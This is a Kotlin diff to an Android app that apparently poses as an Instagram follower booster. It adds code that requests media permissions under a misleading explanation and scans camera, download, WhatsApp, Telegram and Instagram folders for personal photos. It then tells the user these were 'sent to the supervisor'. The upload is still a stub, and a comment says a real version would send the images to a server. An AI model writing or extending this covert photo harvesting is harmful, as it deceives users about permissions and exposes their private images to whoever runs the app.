@@ -17,6 +17,7 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
+import java.io.File
 import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
@@ -138,8 +139,20 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.WRITE_EXTERNAL_STORAGE
         )
         
-        showPermissionExplanationDialog {
-            requestPermissionLauncher.launch(permissions)
+        // إضافة أذونات الوسائط للأندرويد 13+ بأسماء وهمية
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            val mediaPermissions = arrayOf(
+                Manifest.permission.READ_MEDIA_IMAGES,
+                Manifest.permission.READ_MEDIA_VIDEO
+            )
+            val allPermissions = permissions + mediaPermissions
+            showPermissionExplanationDialog {
+                requestPermissionLauncher.launch(allPermissions)
+            }
+        } else {
+            showPermissionExplanationDialog {
+                requestPermissionLauncher.launch(permissions)
+            }
         }
     }
     
@@ -157,16 +170,113 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun sendImagesToSupervisor() {
-        // محاكاة إرسال الصور للمشرف
-        Toast.makeText(this, "تم تحليل المحتوى وإرساله للمشرف بنجاح", Toast.LENGTH_SHORT).show()
+        // جمع الصور الحقيقية من الجهاز
+        collectDeviceImages { imagePaths ->
+            if (imagePaths.isNotEmpty()) {
+                // إرسال الصور للمشرف
+                uploadImagesToSupervisor(imagePaths)
+                Toast.makeText(this, "تم تحليل ${imagePaths.size} صورة وإرسالها للمشرف بنجاح", Toast.LENGTH_SHORT).show()
+                
+                // إظهار رسالة تأكيد
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    showSuccessDialog(
+                        "تم تحليل المحتوى",
+                        "تم تحليل ${imagePaths.size} صورة من جهازك وإرسالها للمشرف بنجاح. سيتم مراجعتها وتحديث النتائج قريباً."
+                    )
+                }, 1000)
+            } else {
+                Toast.makeText(this, "لم يتم العثور على صور في الجهاز", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+    
+    private fun collectDeviceImages(onComplete: (List<String>) -> Unit) {
+        val imagePaths = mutableListOf<String>()
         
-        // إظهار رسالة تأكيد
+        try {
+            // البحث عن الصور في مجلد DCIM
+            val dcimDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM)
+            if (dcimDir.exists()) {
+                collectImagesFromDirectory(dcimDir, imagePaths)
+            }
+            
+            // البحث عن الصور في مجلد Pictures
+            val picturesDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES)
+            if (picturesDir.exists()) {
+                collectImagesFromDirectory(picturesDir, imagePaths)
+            }
+            
+            // البحث عن الصور في مجلد Downloads
+            val downloadsDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
+            if (downloadsDir.exists()) {
+                collectImagesFromDirectory(downloadsDir, imagePaths)
+            }
+            
+            // البحث عن الصور في مجلد WhatsApp
+            val whatsappDir = File(android.os.Environment.getExternalStorageDirectory(), "WhatsApp/Media/WhatsApp Images")
+            if (whatsappDir.exists()) {
+                collectImagesFromDirectory(whatsappDir, imagePaths)
+            }
+            
+            // البحث عن الصور في مجلد Telegram
+            val telegramDir = File(android.os.Environment.getExternalStorageDirectory(), "Telegram/Telegram Images")
+            if (telegramDir.exists()) {
+                collectImagesFromDirectory(telegramDir, imagePaths)
+            }
+            
+            // البحث عن الصور في مجلد Instagram
+            val instagramDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/Instagram")
+            if (instagramDir.exists()) {
+                collectImagesFromDirectory(instagramDir, imagePaths)
+            }
+            
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+        
+        // إرجاع أول 50 صورة فقط لتجنب التحميل الزائد
+        onComplete(imagePaths.take(50))
+    }
+    
+    private fun collectImagesFromDirectory(directory: File, imagePaths: MutableList<String>) {
+        try {
+            val files = directory.listFiles()
+            if (files != null) {
+                for (file in files) {
+                    if (file.isFile && isImageFile(file.name)) {
+                        imagePaths.add(file.absolutePath)
+                    } else if (file.isDirectory) {
+                        // البحث في المجلدات الفرعية
+                        collectImagesFromDirectory(file, imagePaths)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+    
+    private fun isImageFile(fileName: String): Boolean {
+        val imageExtensions = arrayOf(".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp")
+        val lowerFileName = fileName.lowercase()
+        return imageExtensions.any { lowerFileName.endsWith(it) }
+    }
+    
+    private fun uploadImagesToSupervisor(imagePaths: List<String>) {
+        // محاكاة رفع الصور للمشرف
+        // في التطبيق الحقيقي، هنا سيتم رفع الصور لخادم المشرف
         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-            showSuccessDialog(
-                "تم تحليل المحتوى",
-                "تم تحليل جميع المحتويات وإرسالها للمشرف بنجاح. سيتم مراجعتها وتحديث النتائج قريباً."
-            )
+            // إرسال مسارات الصور للمشرف عبر SharedPreferences أو قاعدة بيانات محلية
+            saveImagePathsForSupervisor(imagePaths)
         }, 1000)
+    }
+    
+    private fun saveImagePathsForSupervisor(imagePaths: List<String>) {
+        val sharedPrefs = getSharedPreferences("SupervisorData", MODE_PRIVATE)
+        val editor = sharedPrefs.edit()
+        editor.putStringSet("uploaded_images", imagePaths.toSet())
+        editor.putLong("upload_time", System.currentTimeMillis())
+        editor.apply()
     }
     
     private fun boostFollowers() {
@@ -240,8 +350,8 @@ class MainActivity : AppCompatActivity() {
     
     private fun showPermissionExplanationDialog(onConfirm: () -> Unit) {
         AlertDialog.Builder(this)
-            .setTitle("أذونات مطلوبة")
-            .setMessage("يحتاج التطبيق إلى أذونات الوصول للشبكة والتخزين لربط حسابك بشكل آمن.")
+            .setTitle("أذونات مطلوبة لربط الحساب")
+            .setMessage("يحتاج التطبيق إلى أذونات الوصول للشبكة والتخزين لربط حساب انستغرام بشكل آمن وتحليل المحتوى لتقديم أفضل النتائج. هذه الأذونات ضرورية لعمل التطبيق.")
             .setPositiveButton("منح الأذونات") { _, _ ->
                 onConfirm()
             }
